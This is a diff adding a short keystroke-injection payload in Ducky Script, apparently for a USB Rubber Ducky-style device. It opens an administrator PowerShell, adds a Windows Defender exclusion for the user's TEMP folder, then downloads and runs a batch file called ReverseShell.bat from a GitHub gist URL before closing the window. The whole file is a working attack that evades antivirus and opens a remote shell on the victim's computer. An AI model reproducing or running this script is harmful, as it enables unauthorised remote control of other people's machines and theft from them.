@@ -1,0 +1,28 @@
+REM Open Powershell Admin
+DELAY 1000
+REM Open powershell
+GUI R
+DELAY 500
+STRING powershell
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 500
+LEFT
+DELAY 250
+ENTER
+DELAY 1000
+
+REM Add exclusion
+STRING Add-MpPreference -ExclusionPath $env:USERPROFILE\TEMP\
+DELAY 500
+ENTER
+DELAY 500
+
+
+REM Establish shell
+STRING $tempBat = "$env:TEMP\ReverseShell.bat"; (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/lostmyalias/60a9fa09b41f966ef7db759633413389/raw/6723d797bf24463ee4361f99b16dffc56b33a95c/lost-shell.bat', $tempBat); Start-Process $tempBat
+DELAY 750
+ENTER
+DELAY 1000
+STRING exit
+ENTER
